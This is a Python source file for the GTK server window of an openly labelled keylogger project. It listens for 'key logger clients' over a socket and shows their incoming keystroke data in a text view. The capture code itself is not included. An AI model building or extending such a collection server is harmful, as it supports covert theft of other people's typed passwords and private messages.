#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
UIView.py

UI view will create a server window for key logger
"""

__author__ = "Sunil"
__copyright__ = "Copyleft 2015, keylogger Project"
__license__ = "GPL 3.0"
__version__ = "0.0.0"
__email__ = "sunhick@gmail.com"


import logging
import thread
from ServerSocket import ServerSocket
from gi.repository import Gtk


class ServerWindow:
    """
    Server UI window for key logger
    """    
    def __init__(self):
        self._log = logging.getLogger(__name__)
        self._log.debug('Gtk window init')
        self._texts = ''

        self._builder = Gtk.Builder()
        self._builder.add_from_file('ui.glade')
        self._builder.connect_signals(self)
        self._mainwindow = self._builder.get_object('server_window')
        self._textview = self._builder.get_object('text_view')
        
        self.set_window_size()
        self._server_sock = ServerSocket()

    def on_app_exit(self, *args):
        self._log.debug('Quitting key logger app')
        Gtk.main_quit(*args)        

    def get_top_level_window(self):
        return self._mainwindow

    def _callback(self, data):
        textbuffer = self._textview.get_buffer()
        self._texts += data
        textbuffer.set_text(self._texts)

    def start_listening(self, widget):
        self._log.info('Starting listening to the key logger clients')
        thread.start_new_thread(self._server_sock.start, (self._callback,))

    def stop_listening(self, widget):
        self._log.info('Stop listening to the key logger clients')
        thread.start_new_thread(self._server_sock.stop, ())

    def set_window_size(self):
        window = self.get_top_level_window()
        screen = window.get_screen()

        # collect data about each monitor
        monitors = []
        nmons = screen.get_n_monitors()
        self._log.info('There are %d monitors' % (nmons))
        
        for m in range(nmons):
            mg = screen.get_monitor_geometry(m)
            self._log.info('Monitor %d: %d x %d' % (m, mg.width, mg.height))
            monitors.append(mg)

        # current monitor
        curmon = screen.get_monitor_at_window(screen.get_active_window())
        width, height = monitors[curmon].width, monitors[curmon].height
        self._log.info('Monitor %d: %d x %d (current)' % (curmon, width, height))

        ww = 3*width/4
        wh = 3*height/4

        window.set_size_request(ww, wh)
